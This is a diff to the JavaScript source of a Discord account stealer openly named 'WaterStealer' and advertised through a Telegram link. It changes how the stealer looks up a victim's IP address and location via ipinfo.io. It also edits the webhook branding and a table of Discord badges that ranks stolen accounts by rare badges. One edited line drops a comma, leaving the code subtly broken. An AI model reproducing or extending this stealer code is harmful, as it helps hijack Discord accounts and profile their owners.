@@ -8,8 +8,7 @@ const querystring = require("querystring");
 const fs = require("fs");
 
 async function getIp() {
-    var ip = await axios.get("https://www.myexternalip.com/raw")
-    return ip.data;
+    return (await axios.get("https://ipinfo.io/json")).data;
 }
 
 var config = {
@@ -28,61 +27,61 @@ var config = {
         username: "WaterStealer",
         footer: {
             text: `WaterStealer`,
-            icon_url: "https://cdn.discordapp.com/attachments/1070413312971509921/1073954368665161748/mini.png",
+            icon_url: "https://cdn.discordapp.com/icons/1038524136839970966/c1f59fee8f2263be631d13420922089c.webp?size=96",
         },
         href: "https://t.me/BestStealer",
-        avatar_url: "https://cdn.discordapp.com/attachments/1070413312971509921/1073954368665161748/mini.png"
+        avatar_url: "https://cdn.discordapp.com/icons/1038524136839970966/c1f59fee8f2263be631d13420922089c.webp?size=96"
     },
 
     badges: {
         Discord_Employee: {
             Value: 1,
-            Emoji: "<:staff:874750808728666152>",
+            Emoji: "Staff",
             Rare: true,
         },
         Partnered_Server_Owner: {
             Value: 2,
-            Emoji: "<:partner:874750808678354964>",
+            Emoji: "Partner",
             Rare: true,
         },
         HypeSquad_Events: {
             Value: 4,
-            Emoji: "<:hypesquad_events:874750808594477056>",
+            Emoji: "HypeSquad_Event",
             Rare: true,
         },
         Bug_Hunter_Level_1: {
             Value: 8,
-            Emoji: "<:bughunter_1:874750808426692658>",
+            Emoji: "Bounty_Hunter"
             Rare: true,
         },
         Early_Supporter: {
             Value: 512,
-            Emoji: "<:early_supporter:874750808414113823>",
+            Emoji: "Early",
             Rare: true,
         },
         Bug_Hunter_Level_2: {
             Value: 16384,
-            Emoji: "<:bughunter_2:874750808430874664>",
+            Emoji: "Bounty_Hunter",
             Rare: true,
         },
         Early_Verified_Bot_Developer: {
             Value: 131072,
-            Emoji: "<:developer:874750808472825986>",
+            Emoji: "Developper",
             Rare: true,
         },
         House_Bravery: {
             Value: 64,
-            Emoji: "<:bravery:874750808388952075>",
+            Emoji: "Bravery",
             Rare: false,
         },
         House_Brilliance: {
             Value: 128,
-            Emoji: "<:brilliance:874750808338608199>",
+            Emoji: "Brillance",
             Rare: false,
         },
         House_Balance: {
             Value: 256,
-            Emoji: "<:balance:874750808267292683>",
+            Emoji: "Balance",
             Rare: false,
         }
     },
